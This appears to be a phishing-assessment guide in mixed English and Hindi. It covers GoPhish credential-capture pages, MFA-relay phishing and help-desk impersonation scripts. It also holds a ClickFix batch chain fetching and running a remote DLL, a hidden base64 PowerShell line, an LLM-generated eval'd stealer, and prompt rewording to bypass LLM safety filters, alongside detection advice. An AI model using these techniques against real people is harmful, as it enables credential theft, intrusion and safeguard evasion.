# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### कॉन्फ़िगरेशन

**TLS certificate कॉन्फ़िगरेशन**

इस चरण से पहले आप जिस **domain** का उपयोग करने वाले हैं उसे **पहले से खरीद लिया** होना चाहिए और वह उस **VPS के IP** की ओर **pointing** होना चाहिए जहाँ आप **gophish** कॉन्फ़िगर कर रहे हैं।
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**मेल कॉन्फ़िगरेशन**

इंस्टॉल करें: `apt-get install postfix`

फिर डोमेन निम्न फ़ाइलों में जोड़ें:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**इसके अलावा /etc/postfix/main.cf के अंदर निम्नलिखित वेरिएबल्स के मान बदलें**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

अंत में फ़ाइलें **`/etc/hostname`** और **`/etc/mailname`** को अपने डोमेन नाम से बदलें और **अपने VPS को रीस्टार्ट करें।**

अब, `mail.<domain>` के लिए **DNS A record** बनाएं जो VPS के **ip address** की ओर इशारा करे, और `mail.<domain>` की ओर इशारा करता हुआ एक **DNS MX** रिकॉर्ड बनाएं।

अब ईमेल भेजकर टेस्ट करें:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish के निष्पादन को रोकें और इसे कॉन्फ़िगर करें।\
`/opt/gophish/config.json` को निम्नलिखित के रूप में संशोधित करें (ध्यान दें https का उपयोग):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish सेवा कॉन्फ़िगर करें**

gophish सेवा बनाने के लिए ताकि इसे स्वचालित रूप से शुरू किया जा सके और एक सेवा के रूप में प्रबंधित किया जा सके, आप फ़ाइल `/etc/init.d/gophish` बना सकते हैं जिसमें निम्नलिखित सामग्री हो:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
सेवा का कॉन्फ़िगरेशन पूरा करें और यह जाँचें कि यह क्या कर रहा है:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## मेल सर्वर और डोमेन कॉन्फ़िगर करना

### प्रतीक्षा करें & वैध रहें

डोमेन जितना पुराना होगा, उसे spam के रूप में पकड़े जाने की संभावना उतनी ही कम होगी। इसलिए आपको phishing assessment से पहले जितना संभव हो उतना इंतजार करना चाहिए (कम से कम 1 सप्ताह)। इसके अलावा, यदि आप किसी reputational sector के बारे में एक पेज रखते हैं तो मिलने वाली reputation बेहतर होगी।

ध्यान रखें कि भले ही आपको एक सप्ताह इंतजार करना पड़े, आप अभी सब कुछ कॉन्फ़िगर कर सकते हैं।

### Reverse DNS (rDNS) record कॉन्फ़िगर करें

एक rDNS (PTR) रिकॉर्ड सेट करें जो VPS के IP address को डोमेन नाम पर resolve करे।

### Sender Policy Framework (SPF) Record

आपको नए डोमेन के लिए **SPF record कॉन्फ़िगर करना होगा**। यदि आप नहीं जानते कि SPF record क्या है [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

आप [https://www.spfwizard.net/](https://www.spfwizard.net) का उपयोग अपने SPF policy जनरेट करने के लिए कर सकते हैं (VPS मशीन के IP का उपयोग करें)

![](<../../images/image (1037).png>)

यह वह content है जिसे डोमेन के TXT record में सेट करना चाहिए:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### डोमेन-आधारित मैसेज ऑथेंटिकेशन, रिपोर्टिंग & अनुरूपता (DMARC) रिकॉर्ड

आपको नए डोमेन के लिए **DMARC रिकॉर्ड कॉन्फ़िगर करना होगा**। यदि आप नहीं जानते कि DMARC रिकॉर्ड क्या है [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

आपको `_dmarc.<domain>` होस्टनेम की ओर इशारा करते हुए एक नया DNS TXT रिकॉर्ड बनाना होगा, जिसका कंटेंट निम्न होगा:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

आपको नए डोमेन के लिए **DKIM कॉन्फ़िगर करना होगा**। अगर आप नहीं जानते कि DMARC रिकॉर्ड क्या है [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> आपको DKIM key द्वारा उत्पन्न दोनों B64 मानों को concatenate करना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपनी ईमेल कॉन्फ़िगरेशन का स्कोर जाँचें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com/)\ का उपयोग करके कर सकते हैं। बस पेज खोलें और उस पते पर एक ईमेल भेजें जो वे आपको देते हैं:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
आप `check-auth@verifier.port25.com` पर ईमेल भेजकर और **प्रतिक्रिया पढ़कर** भी **अपने ईमेल कॉन्फ़िगरेशन की जाँच कर सकते हैं** (इसके लिए आपको पोर्ट **25** को **open** करना होगा और प्रतिक्रिया _/var/mail/root_ फाइल में देखनी होगी यदि आप ईमेल root के रूप में भेजते हैं).\
जांचें कि आप सभी परीक्षण पास कर रहे हैं:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
आप अपने नियंत्रण वाले Gmail पर **संदेश भेज सकते हैं**, और अपने Gmail inbox में **ईमेल के headers** की जाँच कर सकते हैं; `dkim=pass` को `Authentication-Results` header field में मौजूद होना चाहिए।
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) आपको बता सकता है कि आपका domain spamhouse द्वारा ब्लॉक किया जा रहा है या नहीं। आप अपने domain/IP को हटाने का अनुरोध कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​आप अपना domain/IP हटाने का अनुरोध [https://sender.office.com/](https://sender.office.com) पर कर सकते हैं।

## Create & Launch GoPhish Campaign

### Sending Profile

- टेम्पलेट के sender profile की पहचान के लिए कोई **name to identify** सेट करें
- यह तय करें कि आप phishing emails किस account से भेजने वाले हैं। सुझाव: _noreply, support, servicedesk, salesforce..._
- आप username और password खाली छोड़ सकते हैं, लेकिन Ignore Certificate Errors को चेक करना सुनिश्चित करें

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> यह सलाह दी जाती है कि सब कुछ काम कर रहा है यह टेस्ट करने के लिए "**Send Test Email**" फ़ंक्शन का उपयोग करें।\
> मैं सुझाव दूँगा कि **send the test emails to 10min mails addresses** ताकि परीक्षण करते समय blacklisted होने से बचा जा सके।

### Email Template

- टेम्पलेट की पहचान के लिए कोई **पहचान के लिए नाम** सेट करें
- फिर कोई **विषय** लिखें (कुछ अजीब नहीं, बस ऐसा कुछ जो आप सामान्य ईमेल में पढ़ सकते हैं)
- सुनिश्चित करें कि आपने "**Add Tracking Image**" को चेक किया हुआ है
- लिखें **ईमेल टेम्पलेट** (आप नीचे दिए उदाहरण की तरह variables इस्तेमाल कर सकते हैं):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **non existent address** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### लैंडिंग पेज

- एक **नाम लिखें**
- वेब पेज का **HTML कोड लिखें**। ध्यान दें कि आप वेब पेज **इम्पोर्ट** कर सकते हैं।
- **Capture Submitted Data** और **Capture Passwords** को मार्क करें
- एक **रीडिरेक्शन सेट** करें

![](<../../images/image (826).png>)

> [!TIP]
> आमतौर पर आपको पेज का HTML कोड मॉडिफाई करना होगा और लोकल में कुछ टेस्ट करने होंगे (शायद किसी Apache server का उपयोग करके) **जब तक आप परिणाम से संतुष्ट न हों।** फिर, उस HTML कोड को बॉक्स में लिखें.\
> ध्यान दें कि अगर आपको HTML के लिए कुछ स्थैतिक रिसोर्सेज़ का उपयोग करना है (शायद कुछ CSS और JS पेज) आप उन्हें _**/opt/gophish/static/endpoint**_ में सेव कर सकते हैं और फिर उन्हें _**/static/\<filename>**_ से एक्सेस कर सकते हैं

> [!TIP]
> रीडिरेक्शन के लिए आप उपयोगकर्ताओं को शिकार की वास्तविक मुख्य वेबसाइट पर **redirect** कर सकते हैं, या उदाहरण के लिए _/static/migration.html_ पर भेज सकते हैं, कुछ **spinning wheel** ([**https://loading.io/**](https://loading.io)**) 5 सेकंड तक दिखाएँ और फिर बताएं कि प्रक्रिया सफल रही।

### Users & Groups

- एक नाम सेट करें
- **Import the data** (ध्यान दें कि टेम्पलेट का उपयोग करने के लिए आपके पास प्रत्येक यूजर के firstname, last name और email address होने चाहिए)

![](<../../images/image (163).png>)

### Campaign

अंत में, एक campaign बनाएं जिसमें एक नाम, email template, landing page, URL, sending profile और group चुनें। ध्यान दें कि URL वह लिंक होगा जो शिकारियों को भेजा जाएगा

ध्यान दें कि **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![](<../../images/image (192).png>)

> [!TIP]
> मैं सुझाव दूंगा कि **test emails को 10min mails addresses पर भेजें** ताकि टेस्ट करते समय ब्लैकलिस्ट होने से बचा जा सके।

जब सब कुछ तैयार हो, बस campaign लॉन्च करें!

## वेबसाइट क्लोनिंग

यदि किसी कारण से आप वेबसाइट क्लोन करना चाहते हैं तो निम्न पेज देखें:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

कुछ phishing assessments (मुख्य रूप से Red Teams के लिए) में आप यह भी चाहेंगे कि **ऐसे फाइल्स भेजें जिनमें किसी तरह का backdoor हो** (शायद कोई C2 या शायद कुछ ऐसा जो authentication ट्रिगर करे).\
कुछ उदाहरणों के लिए निम्न पेज देखें: 


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

पिछला हमला काफी चालाक है क्योंकि आप एक असली वेबसाइट का नक्कल करके उपयोगकर्ता द्वारा सेट की गई जानकारी इकट्ठा कर रहे हैं। दुर्भाग्यवश, अगर उपयोगकर्ता ने सही पासवर्ड नहीं डाला या यदि आपने जिस एप्लिकेशन की नक़ल की है वह 2FA के साथ कॉन्फ़िगर है, तो **यह जानकारी आपको धोखे में रखे गए उपयोगकर्ता की नकल करने की अनुमति नहीं देगी**।

इसीलिए [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) और [**muraena**](https://github.com/muraenateam/muraena) जैसे टूल्स उपयोगी हैं। यह टूल आपको एक MitM जैसी आक्रमण जनरेट करने की अनुमति देगा। मूलतः, हमला इस तरह काम करता है:

1. आप असली वेबपेज के लॉगिन फॉर्म की **नक़ल** करते हैं।
2. उपयोगकर्ता अपने **credentials** आपकी फेक पेज पर **भेजता** है और टूल उनको असली वेबपेज पर भेजता है, **जाँचता है कि credentials काम करते हैं या नहीं**।
3. अगर अकाउंट **2FA** के साथ कॉन्फ़िगर है, तो MitM पेज उससे पूछेगा और जब **उपयोगकर्ता उसे दर्ज करेगा** तो टूल उसे असली वेब पेज पर भेज देगा।
4. जब उपयोगकर्ता प्रमाणीकृत हो जाता है तो आप (attacker) ने **credentials, the 2FA, the cookie और किसी भी इंटरैक्शन की जानकारी** पकड़ ली होगी जबकि टूल MitM कर रहा था।

### Via VNC

यह क्या होगा अगर आप शिकार को मूल पेज जैसा दिखने वाले एक malicious पेज पर भेजने के बजाय उन्हें **VNC session में भेजें जिसमें ब्राउज़र वास्तविक वेब पेज से जुड़ा हो**? आप यह देख पाएंगे कि वह क्या कर रहा है, पासवर्ड चुरा सकेंगे, उपयोग किया गया MFA, cookies...\
आप यह [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) के साथ कर सकते हैं

## डिटेक्ट होने का पता लगाना

स्पष्टतः यह जानने का एक बेहतरीन तरीका कि क्या आपको पकड़ा गया है वह है कि **अपने डोमेन को ब्लैकलिस्ट में सर्च करें**। अगर यह लिस्टेड दिखता है तो किसी तरह आपका डोमेन संदिग्ध के रूप में पहचाना गया है।\
एक आसान तरीका यह चेक करने का कि आपका डोमेन किसी ब्लैकलिस्ट में है या नहीं वह है [https://malwareworld.com/](https://malwareworld.com) का उपयोग करना

हालाँकि, अन्य तरीके भी हैं जिससे पता चलता है कि शिकार **सक्रिय रूप से जंगल में संदिग्ध phishing गतिविधि खोज रहा है** जैसा कि समझाया गया है:


{{#ref}}
detecting-phising.md
{{#endref}}

आप **शिकार के डोमेन के बहुत समान नाम** वाला डोमेन खरीद सकते हैं **और/या** अपने नियंत्रित किसी डोमेन के **subdomain** के लिए एक certificate जेनरेट कर सकते हैं जिसमें शिकार के डोमेन का **keyword** शामिल हो। यदि **शिकार** किसी भी तरह की **DNS या HTTP interaction** करता है उन पर, तो आपको पता चल जाएगा कि **वह सक्रिय रूप से संदिग्ध डोमेन्स ढूँढ रहा है** और आपको बहुत stealth होने की आवश्यकता होगी।

### फ़िशिंग का मूल्यांकन करें

देखें कि आपका ईमेल spam फ़ोल्डर में जाएगा या ब्लॉक/सफल होगा, इसके लिए [**Phishious**](https://github.com/Rices/Phishious) का उपयोग करें।

## High-Touch Identity Compromise (Help-Desk MFA Reset)

आधुनिक intrusion सेट्स अक्सर ईमेल लुअर को पूरी तरह छोड़कर **सीधे service-desk / identity-recovery workflow** को लक्षित करते हैं ताकि MFA को मात दी जा सके। यह हमला पूरी तरह "living-off-the-land" है: एक बार ऑपरेटर के पास valid credentials आ जाएँ, वे बिल्ट-इन admin टूलिंग के साथ pivot करते हैं – कोई मैलवेयर आवश्यक नहीं है।

### Attack flow
1. Recon the victim
* LinkedIn, data breaches, public GitHub आदि से व्यक्तिगत और कॉर्पोरेट जानकारी इकट्ठा करें।
* उच्च-मूल्य पहचानें (executives, IT, finance) और password / MFA reset के लिए **exact help-desk process** का enumeration करें।
2. Real-time social engineering
* help-desk को फोन, Teams या चैट करें जबकि आप लक्ष्य की नकल कर रहे हों (अक्सर **spoofed caller-ID** या **cloned voice** के साथ)।
* पहले से एकत्रित PII प्रदान करें ताकि knowledge-based verification पास हो सके।
* एजेंट को मनाएं कि वह **MFA secret reset** करे या किसी रजिस्टर मोबाइल नंबर पर **SIM-swap** करे।
3. Immediate post-access actions (≤60 min in real cases)
* किसी भी web SSO पोर्टल के माध्यम से foothold स्थापित करें।
* AD / AzureAD को बिल्ट-इन टूल्स से enumerate करें (कोई बाइनरी ड्रॉप किए बिना):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* **WMI**, **PsExec**, या वातावरण में पहले से whitelist किए गए वैध **RMM** agents के साथ lateral movement।

### Detection & Mitigation
* help-desk identity recovery को एक **privileged operation** के रूप में मानें – step-up auth और manager approval की आवश्यकता रखें।
* ऐसे rules (Identity Threat Detection & Response (ITDR) / **UEBA**) लागू करें जो अलर्ट करें जब:
* MFA method बदल गया + नए डिवाइस / भू-स्थान से authentication।
* उसी principal (user-→-admin) की तुरंत elevation।
* help-desk कॉल्स को रिकॉर्ड करें और किसी भी reset से पहले **पहले से रजिस्टर्ड नंबर** पर call-back लागू करें।
* Just-In-Time (JIT) / Privileged Access लागू करें ताकि नव-रीसेट किए गए अकाउंट्स **अपने आप** उच्च-प्रिविलेज टोकन inherit न कर सकें।

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews उच्च-टच ऑपरेशन्स की लागत को उस मास अटैक से ऑफसेट करते हैं जो **search engines & ad networks को delivery channel** में बदल देते हैं।

1. **SEO poisoning / malvertising** एक फेक रिज़ल्ट जैसे `chromium-update[.]site` को शीर्ष search ads में धकेलता है।
2. शिकार एक छोटा **first-stage loader** डाउनलोड करता है (अक्सर JS/HTA/ISO)। Unit 42 द्वारा देखे गए उदाहरण:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader ब्राउज़र cookies + credential DBs को exfiltrate करता है, फिर एक **silent loader** खींचता है जो रीयल-टाइम में तय करता है कि क्या deploy करना है:
* RAT (उदा. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* newly-registered domains को ब्लॉक करें और *search-ads* पर Advanced DNS / URL Filtering लागू करें साथ ही ईमेल पर भी।
* सॉफ़्टवेयर इंस्टॉलेशन को signed MSI / Store packages तक सीमित करें, `HTA`, `ISO`, `VBS` execution को नीति द्वारा नकारें।
* ब्राउज़रों के child processes को installers खोलते हुए मॉनिटर करें:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* पहले-स्टेज loaders द्वारा बार-बार abused किए गए LOLBins (उदा. `regsvr32`, `curl`, `mshta`) के लिए hunt करें।

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory जिसमें एक **Update** बटन होता है जो स्टेप-बाय-स्टेप “fix” निर्देश दिखाता है। शिकारों को कहा जाता है कि वे एक बैच चलाएँ जो एक DLL डाउनलोड करता है और `rundll32` के जरिए execute करता है।
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload को `%TEMP%` में ड्रॉप करता है, एक छोटा sleep नेटवर्क जिटर को छिपाता है, फिर `rundll32` exported entrypoint (`notepad`) को कॉल करता है।
* DLL host identity को beacon करता है और हर कुछ मिनटों में C2 को पोल करता है। रिमोट टास्किंग **base64-encoded PowerShell** के रूप में आती है जिसे hidden और policy bypass के साथ execute किया जाता है:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* यह C2 लचीलापन बनाए रखता है (server बिना DLL अपडेट किए टास्क बदल सकता है) और console विंडो को छिपाता है। `rundll32.exe` के PowerShell चाइल्ड्स को Hunt करें जो `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` एक साथ उपयोग करते हैं।
* Defenders HTTP(S) callbacks के रूप `...page.php?tynor=<COMPUTER>sss<USER>` और DLL लोड के बाद 5-मिनट polling intervals खोज सकते हैं।

---

## AI-Enhanced Phishing Operations
Attackers अब **LLM & voice-clone APIs** को chained करके पूर्ण रूप से personalise किए गए लुअर्स और रीयल-टाइम इंटरैक्शन करते हैं।

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• अनट्रस्टेड automation से भेजे गए संदेशों को हाइलाइट करने के लिए **dynamic banners** जोड़ें (ARC/DKIM anomalies के माध्यम से)।  
• हाई-रिस्क फोन अनुरोधों के लिए **voice-biometric challenge phrases** लागू करें।  
• awareness programmes में लगातार AI-generated लुअर्स का सिमुलेशन करें – static टेम्पलेट्स obsolete हो चुके हैं।

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers benign-लुकिंग HTML भेज सकते हैं और रनटाइम पर **stealer generate** कर सकते हैं किसी **trusted LLM API** से JavaScript माँग कर, फिर उसे ब्राउज़र में execute करना (उदा., `eval` या dynamic `<script>`).

1. **Prompt-as-obfuscation:** exfil URLs/Base64 strings को prompt में encode करें; safety filters को बायपास करने और hallucinations कम करने के लिए wording iterate करें।
2. **Client-side API call:** load पर, JS एक public LLM (Gemini/DeepSeek/etc.) या एक CDN proxy को call करता है; static HTML में केवल prompt/API call मौजूद होता है।
3. **Assemble & exec:** response को concatenate करें और execute करें (प्रति विजिट polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code लुभावना संदेश को व्यक्तिगत बनाता है (उदा., LogoKit token parsing) और creds को prompt-hidden endpoint पर पोस्ट करता है।

**Evasion traits**
- Traffic प्रसिद्ध LLM domains या reputable CDN proxies को हिट करता है; कभी-कभी WebSockets के जरिए backend तक जाता है।
- कोई static payload नहीं; malicious JS केवल render के बाद मौजूद होता है।
- Non-deterministic generations हर session के लिए **unique** stealers पैदा करते हैं।

**Detection ideas**
- JS सक्षम sandboxes चलाएँ; LLM responses से आने वाले **runtime `eval`/dynamic script creation** को फ्लैग करें।
- front-end से LLM APIs को भेजे गए POSTs की तलाश करें जो तुरंत बाद returned text पर `eval`/`Function` द्वारा चलाए जाते हों।
- client traffic में unsanctioned LLM domains पर अलर्ट करें और subsequent credential POSTs पर भी ध्यान दें।

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators बस help-desk कॉल के दौरान **force a new MFA registration** कर देते हैं, जिससे user के existing token nullify हो जाते हैं। Any subsequent login prompt पीड़ित के लिए वैध दिखाई देता है।
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.



## Clipboard Hijacking / Pastejacking

